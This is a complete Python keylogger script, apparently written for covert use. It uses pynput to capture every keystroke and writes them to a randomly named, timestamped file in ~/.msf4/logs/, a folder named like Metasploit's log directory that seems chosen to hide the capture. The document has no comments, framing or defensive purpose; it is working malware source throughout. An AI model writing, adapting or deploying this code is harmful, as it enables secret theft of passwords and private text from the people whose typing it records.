import time
from pathlib import Path
import random
import os
from pynput import keyboard
t = time.localtime()
timestamp = time.strftime('%b-%d-%Y', t)
PATH = '/home/' + os.getlogin() + '/.msf4/logs/'
hellarea = random.randint(0, 100)
hellar = str(hellarea)
fileab = PATH + timestamp + hellar + "-templog.txt"
def stage1():
    isExist = os.path.exists(PATH)
    if not isExist:
        os.makedirs(PATH)
    fle = Path(fileab)
    fle.touch(exist_ok=True)
    stage3()
def stage3():
    def write(text):
        with open(fileab, 'a') as f:
            f.write(text)
            f.close()
    def on_key_press(Key):
        try:
            if (Key == keyboard.Key.enter):
                write("<Enter Press> \n")
            else:
                write(Key.char)
        except AttributeError:
            if Key == keyboard.Key.backspace:
                write(" <back space> \n")
            elif (Key == keyboard.Key.tab):
                write(" <tab> \n")
            elif (Key == keyboard.Key.space):
                write(" <space> \n");
            else:
                temp = repr(Key)
                write(temp)
    def on_key_release(Key):
        if (Key == keyboard.Key.esc):
            stage1()
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()
def catc():
    stage1()
catc()


